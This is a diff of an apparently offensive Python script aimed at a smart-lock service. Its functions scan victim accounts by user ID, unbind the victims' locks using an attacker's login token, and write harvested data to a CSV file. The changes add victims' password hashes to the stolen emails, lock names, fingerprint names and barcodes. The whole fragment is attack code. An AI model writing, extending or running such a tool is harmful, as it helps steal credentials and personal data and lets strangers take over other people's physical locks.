@@ -132,7 +132,7 @@ def scan_id(victim_userID, attacker_token, attacker_userID, headers):
 	if name != 'N/A':
 		with open('userdata.csv', 'a') as f:
 			writer = csv.writer(f)
-			writer.writerow([email_address,name,prints_name,barcode])
+			writer.writerow([email_address,password_hash,name,prints_name,barcode])
 
 		unbind(victim_userID, lockId, attacker_token, barcode, headers)
 
@@ -142,7 +142,7 @@ def scan_id(victim_userID, attacker_token, attacker_userID, headers):
 		print('\nNo lock bound to account.\n')
 		with open('userdata.csv', 'a') as f:
 			writer = csv.writer(f)
-			writer.writerow([email_address,'N/A','N/A','N/A'])
+			writer.writerow([email_address,password_hash,'N/A','N/A','N/A'])
 
 
 #unbind the lock from the victim account
@@ -192,7 +192,7 @@ def main():
 
 	with open('userdata.csv', 'w') as f:
 			writer = csv.writer(f)
-			writer.writerow(['email','lock_name','fingerprint_name','barcode']) 
+			writer.writerow(['email','password_hash','lock_name','fingerprint_name','barcode']) 
 
 	attacker_token_userID = login_attacker(attacker_email_address, attacker_password)
 
